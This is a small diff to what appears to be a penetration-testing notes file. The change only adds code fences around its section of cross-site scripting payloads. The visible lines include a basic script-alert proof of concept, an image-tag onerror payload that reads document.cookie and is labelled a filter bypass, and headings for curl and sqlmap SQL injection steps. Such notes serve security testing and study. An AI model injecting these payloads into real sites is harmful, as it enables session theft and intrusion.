@@ -19,6 +19,7 @@ curl [http://172.20.0.2](http://172.20.0.2)
 ```
 
 ## 3. Cross-Site Scripting (XSS) Payloads
+```bash
 <!-- 1. Basic Proof of Concept (PoC) -->
 <script>alert('XSS')</script>
 
@@ -27,6 +28,7 @@ curl [http://172.20.0.2](http://172.20.0.2)
 
 <!-- 3. WAF/Filter Bypass (Using <img> tag) -->
 <img src=x onerror=alert(document.cookie)>
+```
 
 ## 4. Automated SQLi (sqlmap)
 ```bash
